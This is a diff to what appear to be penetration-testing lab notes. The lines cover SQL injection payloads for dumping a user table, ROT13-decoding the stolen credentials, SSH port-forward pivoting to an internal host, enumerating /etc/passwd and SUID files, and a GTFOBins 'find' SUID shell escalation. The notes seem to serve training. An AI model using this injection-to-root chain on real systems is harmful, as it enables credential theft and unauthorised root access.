@@ -124,4 +124,9 @@ firefox -> 127.0.0.1:1112
 Go through options, use GET method in order to find the correct one.
 # ?product=7 OR 1=1 -> UNION SELECT 1,2,3,4 # (error means take a number away) -> (1,3,2) table_schema.column,column_name.table_name from information.schema.columns #
 Duplicate the tab in order to save information, # UNION SELECT user_id,name,username from siteusers.users #
-
+Rot13 the creds found, this gives you the passwords for the users you found for the next box. 
+# ssh -S /tmp/t1 t1 -O forward -L2222:192.168.28.165:22
+# ssh -MS /tmp/t2 user3@127.0.0.1 -p 2222
+(user credentials for account from ROT13 decode)
+#Enumerate new system, cat /etc/hosts, sudo -l, cat /etc/passwd, find / -type f -perm /6000 -ls 2>/dev/null
+Go to GTFObins -> Search find -> SUID method -> ./find . -exec /bin/sh -p \; -quit -> id 
